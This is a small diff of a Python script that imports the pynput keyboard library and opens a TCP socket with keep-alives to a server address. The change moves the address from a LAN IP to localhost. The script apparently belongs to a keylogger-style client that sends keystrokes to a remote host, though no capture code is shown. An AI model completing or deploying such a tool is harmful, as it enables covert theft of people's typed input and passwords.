@@ -3,9 +3,9 @@ from pynput import keyboard
 import time
 import threading
 
-SERVER_ADDRESS = ("192.168.1.62", 9090)
+SERVER_ADDRESS = ("127.0.0.1", 9090)
 BUFFER_SIZE = 4096
-KEEP_ALIVE_INTERVAL = 5  # Invia un keep-alive ogni 5 secondi
+KEEP_ALIVE_INTERVAL = 5
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(SERVER_ADDRESS)
